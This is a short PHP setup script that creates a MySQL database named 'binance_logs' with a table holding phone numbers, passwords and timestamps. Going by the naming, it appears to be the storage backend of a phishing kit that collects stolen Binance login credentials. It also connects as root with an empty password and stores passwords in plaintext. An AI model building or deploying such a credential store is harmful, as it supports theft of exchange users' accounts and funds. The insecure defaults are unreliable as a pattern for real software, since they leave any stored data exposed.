<?php
$host = 'localhost';
$username = 'root';
$password = '';

try {
    // Create connection without database
    $pdo = new PDO("mysql:host=$host", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // Create database
    $sql = "CREATE DATABASE IF NOT EXISTS binance_logs";
    $pdo->exec($sql);
    echo "Database 'binance_logs' created successfully<br>";
    
    // Select database
    $pdo->exec("USE binance_logs");
    
    // Create table
    $sql = "CREATE TABLE IF NOT EXISTS logs (
        id INT AUTO_INCREMENT PRIMARY KEY,
        numero VARCHAR(20) NOT NULL,
        pass VARCHAR(255) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $pdo->exec($sql);
    echo "Table 'logs' created successfully<br>";
    
    echo "Database setup completed!";
    
} catch(PDOException $e) {
    echo "Error: " . $e->getMessage();
}
?> 